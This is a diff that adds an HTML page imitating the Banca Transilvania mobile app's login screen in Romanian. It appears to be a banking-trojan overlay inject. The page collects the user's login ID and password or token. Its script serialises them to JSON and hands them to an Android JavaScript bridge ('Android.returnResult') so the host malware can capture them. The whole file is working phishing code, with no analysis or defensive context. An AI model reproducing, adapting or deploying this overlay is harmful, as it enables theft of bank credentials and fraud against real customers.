@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>btrl</title>
+    <link rel="shortcut icon" href="ro.btrl.mobile.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #2e4253;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+        background-size: 100%;
+    }
+    .logo {
+text-align: left;
+    background-size: 100%;
+    padding: 20px 0px 20px 0px;
+    background: none;
+    color: #fff;
+    font-weight: 400;
+    text-decoration: none;
+    background: #2b3947;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 10px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 10px 0px;
+    color: #fff;
+    text-align: left;
+    outline: none;
+    border: 1px solid #42566a;
+    background: #42566a;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #fff;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #197dcc;
+}
+fieldset span {
+    display: inline-block;
+    text-align: center;
+    color: #4b4949;
+    left: 0;
+    right: 0;
+    padding-top: 30px;
+}
+fieldset p {
+    display: inline-block;
+    left: 0;
+    right: 0;
+    color: #088f0d;
+}
+.logo span {
+    display: inline-block;
+    float: left;
+    padding: 40px 0px 0px 20px;
+    font-size: 20px;
+    color: #fff;
+    font-weight: 600;
+}
+input::placeholder {
+    color: #fff;
+    font-size: 15px;
+}
+</style>
+
+<script type="text/javascript">
+    function openLogin() {
+        document.getElementById("home").style.display="none";
+        document.getElementById("log").style.display="block";
+    }
+</script>
+
+<fieldset id="formtosend">
+
+<div class="" id="home" style="display: block;">
+
+<div class="logo1" style="text-align: center;padding-top: 50px;padding-bottom: 50px;">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABCCAMAAAD30aEPAAAC/VBMVEVMaXEAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarNHU5EAarMAarMAarMAarMAarP7xADXtxoAarMAarMAarP7xAD7xAD7xAAoeJYAarMAarMAarMAarMAarMAarMAarMAarMAarP7xACQnk0AarMAarMAarP7xADkvBAAarP7xAD7xAAScKYAarP7xABZinQAarP7xAC0qzP7xADpvg37xAADa7Eue5IAarP7xABtkWX7xACWoEj////////7xAC6rS7////////////////////////////////////////////////////////////////////Xtxr////////////////////////////////7xAD////////////////////////////////////////////////////////////////////////////////////////////7xADtvwr////////////////////////svwsAarP////////7xADguhP////////////////7xADUthzBryn////////7xAChpD/////////7xABzk2H////////7xAA/gYYAarP7xAD////7xAD2wgT7xAD7xAD////7xAD7xABJhX/////////7xAD////////7xADuvwn////7xAD0wgUKbqzhABrhABrhABo0fY7hABrhARrhABriARnhABrhABrhABr7xADhABrhABrnLxThABrhABrhABrhABr6xADhABr7xAAedZ7hABr7xADywQbhABrhABrhABrhABrhABrhABr7xACCmVbhABrhABrEsCcAarPhABr7xADxwAfhABr7xAD7xAAAarPhABrhABrhABrhABoZc6H6xAFPUX3cAh77xAD4qQPnLhThABr7xAD7xAD5swLrSRD7xAD7wQDxeQrkFxf7xAD7xAD7xAAKqsg9AAAA/3RSTlMACTBaeJSvw9bk8P3/3cy7qYlpSiYEQuH3nWQBgOpeFI0Udfu0TID5/+6li3RgUUBt0TmHzDMaR0DVDQXz+6G52BaIyVTaIf/qH+jTyMsKG7HL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" style="width: 100px;">
+</div>
+
+<p style="color: #fff; font-size: 20px;">
+Banca ta in buzuranul tau!
+</p>
+<input type="button" name="sumbit" onclick="openLogin()" value="ACTIVARE" style="background: #283643;color: #fff;font-weight: 400;">
+</div>
+
+<div class="" id="log" style="display: none;">
+
+<div class="logo">
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABCCAMAAAD30aEPAAAC/VBMVEVMaXEAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarMAarNHU5EAarMAarMAarMAarMAarP7xADXtxoAarMAarMAarP7xAD7xAD7xAAoeJYAarMAarMAarMAarMAarMAarMAarMAarMAarP7xACQnk0AarMAarMAarP7xADkvBAAarP7xAD7xAAScKYAarP7xABZinQAarP7xAC0qzP7xADpvg37xAADa7Eue5IAarP7xABtkWX7xACWoEj////////7xAC6rS7////////////////////////////////////////////////////////////////////Xtxr////////////////////////////////7xAD////////////////////////////////////////////////////////////////////////////////////////////7xADtvwr////////////////////////svwsAarP////////7xADguhP////////////////7xADUthzBryn////////7xAChpD/////////7xABzk2H////////7xAA/gYYAarP7xAD////7xAD2wgT7xAD7xAD////7xAD7xABJhX/////////7xAD////////7xADuvwn////7xAD0wgUKbqzhABrhABrhABo0fY7hABrhARrhABriARnhABrhABrhABr7xADhABrhABrnLxThABrhABrhABrhABr6xADhABr7xAAedZ7hABr7xADywQbhABrhABrhABrhABrhABrhABr7xACCmVbhABrhABrEsCcAarPhABr7xADxwAfhABr7xAD7xAAAarPhABrhABrhABrhABoZc6H6xAFPUX3cAh77xAD4qQPnLhThABr7xAD7xAD5swLrSRD7xAD7wQDxeQrkFxf7xAD7xAD7xAAKqsg9AAAA/3RSTlMACTBaeJSvw9bk8P3/3cy7qYlpSiYEQuH3nWQBgOpeFI0Udfu0TID5/+6li3RgUUBt0TmHzDMaR0DVDQXz+6G52BaIyVTaIf/qH+jTyMsKG7HLnNDDlUCZsASo7v/VdgePwGfPsykPrs0w8hagHclQYs6k/Hrf9W85dyUU+f7xfUmULQap3CA2RFUkUtoHTNnB0+HoA6DZzsuJ6hrM4mk70sTcaOMsnIPP6gn7gEQB37gszA2p8t80Nuf+NGAb5xLq/+gKn3tZRuwVcrXXBu1O9vNYcOT28i1lJ+OX0j37ziJq4OGTJ/qMywP4wPb02Mkv8sysHdP4zA3/2NN0S4OSqbmKAAAFWElEQVRYw7WYeVxURRzAh2sX1kHRsCXEyoT4aRyZiaSlZQdmCgSygjzDLUEXhKUQtFBQyERNqDCyNI/SUtC1C0tQcSFKQxA7LDGtTC3ttCy7P868a98D3ttd2H7/vN+b+c33zfE7Zheh/1nc3D08vTRabx9dH0xFp/Pt28+v/4Ar/Ac6z7rSU6PHihLQ96pA/0EO09yDtAHYvgz2u/oaR2jX6rHjoh2gzhxynTd2UoYGhyiv/fpQGCY312uH3xAWGB4RERkZGRLhcWOQl2aErjNTf5MScCTAzYJVn75e4aPcujWLGh3mN1hK9FcCRgPcwlr4eIWMsbPX/oHBwsnpFY3G3gpwG7HwcswjxkRohlLgOGWT8QC3Ews/hz3sjjBfjAOV+ycA3EmAI5wIgUERWn/l3rsA7qYx5rLovQcgNIYQ3VwFHAsAEwnwXpdNcRLAfQTo7jLgZIApBDjKyWGxcbEKPfEA9xNgJEIJiYJMTTLQrmmJUklOEccYpqcyDDPjgTShYabRaHzQBnyIAxoZicyKRWmMXNL5ERmzhZY5GVyLieiZWXz3XC74yB5mz6RGOebch+nzEZTFMHnzzPlELzDPz2SYBfyIXIbJz0llidO4FvqFR1EXIHqM2iQjVLiQPBfFkdcEhBKJXoRQMcMs5kekLClBqDSBGheU0ob0ReQT4vIfB1hKgFFEfYIHohlUWbyMYcpEIKEvl59KATVaQdXpRFmJSkvKhGB+kgBXSYE5VFlZaDaniUBUbs6Wn2YFNYrjJ2hEy/OYRLb9KYCn+dATgc+IH7cBu0gl6UhdTZRnyf6Y6CQ4YBXAc3xyEIDl3KGoA1njJKKsyKN7TU6QB4YCrMFYI9oUJdJPVxan2AE+T9pfyOImSFymXACuJbG8DuP+IpCVF5PKkDqwhHhCAXWk7DzWZdYLwA0EuBFjDxG4yWCYX0SXXqoGLHyJrGIZG06cy8wTgC8T4GaMt8gOJZcqxSrADHIEm+gJozgy02KTyUS4TIXJhNArQItKwEAZkPXwCmUg4eW9upoLa3l4IrQVYBu5DiAZMIMqmYpAwqs08LrJyAkboUYjqq5hvSZIDiyhSqUSsJDMb8l2ToSEgbbze7gD2HQ4Wga0sHE6Wwk4R7LEBZ2BpOjBTozDbMDK5Nfy2RW/rgQskgALOwPfALYC6NlDeXOhaJg3q0TRD6fakm6O2LievL1FnrUEuCtGqNzpZk7K3rbldwN5L3e8NFCvoVP0cVUZfYcCd9dh7OnCoscGs86Ru279Hl72ql5FAGr2qV6oBGnYb+WksUnZyFJFibvqBF9Uk3d5nrVZzeo9CqSlWW/vwvm+wDvQpGZm2coSN9pd9MFGAfiBuuEOFhhKcli46odbBN6hVjtLiWeJbcNwwBYVq2aBZz1s94rYzhJ3H8G+yr7zochrse8OH7FA+PgI1ioFTP0nAu/oXvtAy2SRGNz9r85PD4gT/Myhe3EtR9w2EQ/vjnjMxmuxOBSAnDMC1O7EmlVd59ch8joaHAzp4zyx5nPcr7ODnzgq8k6ecPjuzm8jwBd13l/Kz/ekyLN+5XjWGXJKIH69TycJ69bTNpz1tDN57EybQDw7JeYbwX2OfSvhtZxzLtfWCkRYutmb/UHc2nxewvuuyclcu6FdJMKa78dFocOHrL3hEaJtjvDDuh9/ssp4DT2oBz9PshHhwi/S9f7ainoiF3+TEOH3S/vF8z2HeiZ/xEuJ8Odff1Pc+T09r4KWf2pkSLhwqbGjvnelukpOhLkHe1mqqydIJ3nqXxdU/zPjBVz7f9WuuVBEs8ni7PG1rvsrMTq+beRFp0ddBgWro7Neew/LAAAAAElFTkSuQmCC" style="width: 50px; margin-left: 30px;">
+</div>
+
+<div class="area" style="background: none; padding: 30px; border-radius: 3px;">
+        <input type="text" name="login" id="login" placeholder="     ID de logare (se completeaza cu majuscule)" style="height: 50px;">
+        <input type="password" name="password" id="password" placeholder="     Parola/token" style="height: 50px;">
+        <input name="exit" type="hidden" text="true"/>
+        <input type="button" name="sumbit" onclick="send_form()" value="CONTINUA">
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        returnResult : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+    if (document.getElementById("login").value == '')
+{
+    alert ('Toate câmpurile sunt obligatorii!');
+    return false;
+}
+if (document.getElementById("password").value == '')
+{
+    alert ('Toate câmpurile sunt obligatorii!');
+    return false;
+}
+    var form = document.getElementById('formtosend');
+    Android.returnResult( formToJSONbyName(form) );
+}
+</script>
+
+</body>
+</html>
